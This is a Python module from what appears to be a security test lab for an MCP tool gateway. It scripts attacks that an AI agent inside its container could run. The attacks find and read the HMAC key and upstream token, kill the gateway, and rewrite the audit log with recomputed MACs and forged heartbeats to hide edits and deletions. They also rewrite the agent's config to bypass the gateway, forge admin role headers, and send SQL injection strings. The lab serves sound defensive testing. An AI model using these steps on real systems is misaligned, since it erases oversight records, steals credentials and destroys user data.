"""Attacker actions, executed INSIDE the agent container as the agent user.

Each action uses only what the agent can actually reach: its own filesystem,
its own processes, its own network and its own MCP config. Targets (log,
key, anchor, tool URL, upstream credential) are *discovered*, not handed
over, so the same action behaves differently per deployment profile.

When the agent finds the HMAC key and can stop the gateway, it uses the
"stealth" path: stop the gateway, rewrite the log with a recomputed chain
(and anchor), restart it with the same command line. This is the strongest
attacker the lab models.

Usage: python -m lab.attacks.actions <ACTION>   (prints a JSON report)
"""

import json
import os
import signal
import socket
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

import anyio

from lab.agent.client import CONFIG, connect, load_server
from mcp_lab.gateway.audit.anchor import FileAnchor, Head
from mcp_lab.gateway.audit.canonical import canonical
from mcp_lab.gateway.audit.chain import GENESIS_MAC, compute_mac

SEARCH_ROOTS = ["/home", "/tmp", "/var/lib", "/var/log", "/run", "/srv", "/opt/data"]
DEFAULT_TOOL_URL = "http://tools:9000/mcp"  # what a curious agent would guess from DNS names

report: dict[str, Any] = {"steps": []}


def step(msg: str, **kw: Any) -> None:
    report["steps"].append({"msg": msg, **kw})


# ---- discovery ---------------------------------------------------------------
def find(names: tuple[str, ...], suffixes: tuple[str, ...] = ()) -> list[Path]:
    hits = []
    for root in SEARCH_ROOTS:
        for dirpath, _dirs, files in os.walk(root, onerror=lambda e: None):
            for f in files:
                if f in names or f.endswith(suffixes):
                    hits.append(Path(dirpath) / f)
    return hits


def discover() -> dict[str, Any]:
    logs = [p for p in find((), (".jsonl",)) if "audit" in p.name]
    keys = [p for p in find((), (".key",))]
    anchors = find(("head.json",))
    upstream_tokens = find(("upstream_token",))
    procs = gateway_procs()
    tool_url = DEFAULT_TOOL_URL
    for _pid, argv in procs:
        for a in argv:
            if a.startswith("--upstream=http"):
                tool_url = a.split("=", 1)[1]
    found = {
        "log": next((p for p in logs if os.access(p, os.R_OK)), None),
        "key": next((p for p in keys if os.access(p, os.R_OK)), None),
        "anchor": next((p for p in anchors if os.access(p, os.R_OK)), None),
        "upstream_token": next((p for p in upstream_tokens if os.access(p, os.R_OK)), None),
        "gateway_procs": procs,
        "tool_url": tool_url,
    }
    step("discover", **{k: (str(v) if isinstance(v, Path) else v) for k, v in found.items()})
    return found


def gateway_procs() -> list[tuple[int, list[str]]]:
    out = []
    for pid in os.listdir("/proc"):
        if not pid.isdigit():
            continue
        try:
            argv = Path(f"/proc/{pid}/cmdline").read_bytes().split(b"\0")
        except OSError:
            continue
        argv = [a.decode(errors="replace") for a in argv if a]
        if any(a.endswith("mcp-lab-gateway") for a in argv) and "serve" in argv:
            out.append((int(pid), argv))
    return out


# ---- gateway process control ---------------------------------------------------
def stop_gateway(procs: list[tuple[int, list[str]]]) -> list[str] | None:
    for pid, argv in procs:
        try:
            os.kill(pid, signal.SIGKILL)
            step("killed gateway", pid=pid)
            time.sleep(0.5)
            return argv
        except OSError as e:
            step("kill failed", pid=pid, error=str(e))
    return None


def restart_gateway(argv: list[str]) -> None:
    subprocess.Popen(
        argv, start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    for _ in range(50):
        try:
            socket.create_connection(("127.0.0.1", 8000), timeout=0.2).close()
            step("restarted gateway")
            return
        except OSError:
            time.sleep(0.1)
    step("gateway restart timed out")


# ---- log manipulation ------------------------------------------------------------
def read_entries(path: Path) -> list[dict]:
    return [json.loads(x) for x in path.read_text().splitlines() if x.strip()]


def fill_gaps(entries: list[dict], interval_ms: int) -> list[dict]:
    """Insert forged heartbeats so removed history leaves no time gap."""
    out: list[dict] = []
    for e in entries:
        while out and e["ts_ms"] - out[-1]["ts_ms"] > interval_ms:
            prev = out[-1]
            out.append(
                {
                    "v": 1,
                    "ts_ms": prev["ts_ms"] + interval_ms,
                    "type": "heartbeat",
                    "session": None,
                    "payload": {"n": 0},
                }
            )
        out.append(e)
    # Also cover the gap up to "now", where the restarted gateway will continue.
    now = time.time_ns() // 1_000_000
    while out and now - out[-1]["ts_ms"] > interval_ms:
        out.append(
            {
                "v": 1,
                "ts_ms": out[-1]["ts_ms"] + interval_ms,
                "type": "heartbeat",
                "session": None,
                "payload": {"n": 0},
            }
        )
    return out


def heartbeat_ms(argv: list[str] | None) -> int:
    for a in argv or []:
        if a.startswith("--heartbeat="):
            return int(float(a.split("=", 1)[1]) * 1000)
    return 2000


def write_entries(
    path: Path, entries: list[dict], key: bytes | None, anchor: Path | None, hb_ms: int = 2000
) -> None:
    """Rewrite the log. With the key, recompute seq/prev_mac/mac so the chain verifies."""
    if key is not None:
        entries = fill_gaps(entries, hb_ms)
        prev = GENESIS_MAC
        for i, e in enumerate(entries):
            e["seq"], e["prev_mac"] = i, prev
            e["mac"] = compute_mac(key, e)
            prev = e["mac"]
    path.write_bytes(b"".join(canonical(e) + b"\n" for e in entries))
    step("rewrote log", entries=len(entries), recomputed=key is not None)
    if key is not None and anchor is not None and os.access(anchor, os.W_OK) and entries:
        FileAnchor(anchor).write(Head(seq=entries[-1]["seq"], mac=entries[-1]["mac"]))
        step("rewrote anchor")


def tamper(mutate) -> None:
    f = discover()
    log = f["log"]
    if log is None:
        step("no audit log reachable from the agent")
        return
    if not os.access(log, os.W_OK):
        step("audit log found but not writable")
        return
    key = bytes.fromhex(f["key"].read_text().strip()) if f["key"] else None
    argv = stop_gateway(f["gateway_procs"]) if key else None  # stealth path needs the key
    entries = mutate(read_entries(log))
    write_entries(log, entries, key, f["anchor"], heartbeat_ms(argv))
    if argv:
        restart_gateway(argv)


def _first(entries: list[dict], type_: str) -> int:
    return next(i for i, e in enumerate(entries) if e["type"] == type_)


def a1_edit(entries: list[dict]) -> list[dict]:
    i = _first(entries, "call_request")
    entries[i]["payload"]["args"] = {"customer_id": "C9999"}  # rewrite what was looked up
    step("edited entry", seq=entries[i]["seq"])
    return entries


def a2_delete(entries: list[dict]) -> list[dict]:
    i = _first(entries, "call_request")
    step("deleted entries", seqs=[entries[i]["seq"], entries[i + 1]["seq"]])
    return entries[:i] + entries[i + 2 :]


def a3_truncate(entries: list[dict]) -> list[dict]:
    i = _first(entries, "call_request")
    step("truncated", from_seq=entries[i]["seq"])
    return entries[:i]


def a11_spoof(entries: list[dict]) -> list[dict]:
    last = entries[-1]
    forged = [
        {
            "v": 1,
            "ts_ms": last["ts_ms"] + 1,
            "type": "call_request",
            "session": "operator",
            "payload": {
                "tool": "admin.delete_user",
                "role": "admin",
                "args": {"user_id": "U2002"},
                "args_sha256": "0" * 64,
            },
            "seq": last["seq"] + 1,
            "prev_mac": last["mac"],
            "mac": "0" * 64,
        },
    ]
    step("appended forged admin call_request")
    return entries + forged


# ---- tool-call attacks -------------------------------------------------------------
async def call(tool: str, args: dict, **kw: Any) -> dict:
    try:
        with anyio.fail_after(10):
            async with connect(**kw) as c:
                r = await c.call_tool(tool, args)
                out = {
                    "tool": tool,
                    "is_error": bool(r.is_error),
                    "text": r.content[0].text if r.content else "",
                }
    except BaseException as e:  # noqa: BLE001 - ExceptionGroup from transport failures
        out = {"tool": tool, "exception": type(e).__name__}
    step("call", **out)
    return out


async def warmup() -> None:
    for _ in range(2):
        await call("crm.lookup", {"customer_id": "C1001"})


async def direct_tool_call(f: dict[str, Any]) -> None:
    token = f["upstream_token"].read_text().strip() if f["upstream_token"] else None
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    await call("admin.delete_user", {"user_id": "U2001"}, url=f["tool_url"], headers=headers)


async def a4_config_bypass() -> None:
    f = discover()
    cfg = json.loads(CONFIG.read_text())
    srv = cfg["mcpServers"]["crm"]
    srv["url"] = f["tool_url"]
    if f["upstream_token"]:
        srv["headers"] = {"Authorization": f"Bearer {f['upstream_token'].read_text().strip()}"}
    try:
        CONFIG.write_text(json.dumps(cfg))  # in-place: works on a bind-mounted file
        step("rewrote agent MCP config", url=load_server()["url"])
    except OSError as e:
        step("config not writable", error=str(e))
    await call("admin.delete_user", {"user_id": "U2001"})  # via the edited config


async def a5_kill_then_act() -> None:
    f = discover()
    argv = stop_gateway(f["gateway_procs"])
    if argv is None:
        step("no gateway process visible to the agent")
    await direct_tool_call(f)
    if argv:
        restart_gateway(argv)


async def a6_direct() -> None:
    await direct_tool_call(discover())


async def a7_impersonate() -> None:
    await call("admin.delete_user", {"user_id": "U2001", "role": "admin"})
    await call("crm.lookup", {"customer_id": "C1001", "as_user": "operator"})
    await call(
        "admin.delete_user",
        {"user_id": "U2001"},
        headers={"Authorization": "Bearer forged-admin-token"},
    )
    srv = load_server()
    await call(
        "admin.delete_user",
        {"user_id": "U2001"},
        headers={**srv.get("headers", {}), "X-Role": "admin", "X-User": "operator"},
    )


async def a8_confused_deputy() -> None:
    await call("admin.delete_user", {"user_id": "U2001"})


async def a9_smuggle() -> None:
    await call("crm.update", {"customer_id": "C1001", "field": "password", "value": "x"})
    await call(
        "crm.update",
        {"customer_id": "C1001", "field": "notes", "value": "x", "sql": "'; DROP TABLE users; --"},
    )
    await call("crm.lookup", {"customer_id": "C1001' OR '1'='1"})


async def a10_rug_pull() -> None:
    for _ in range(3):  # tool definition changes after the 3rd upstream call
        await call("crm.lookup", {"customer_id": "C1001"})


ACTIONS = {
    "warmup": warmup,
    "A1": lambda: tamper(a1_edit),
    "A2": lambda: tamper(a2_delete),
    "A3": lambda: tamper(a3_truncate),
    "A4": a4_config_bypass,
    "A5": a5_kill_then_act,
    "A6": a6_direct,
    "A7": a7_impersonate,
    "A8": a8_confused_deputy,
    "A9": a9_smuggle,
    "A10": a10_rug_pull,
    "A11": lambda: tamper(a11_spoof),
}


def main() -> None:
    fn = ACTIONS[sys.argv[1]]
    result = fn()
    if hasattr(result, "__await__"):
        anyio.run(lambda: result)
    print(json.dumps(report, default=str))


if __name__ == "__main__":
    main()
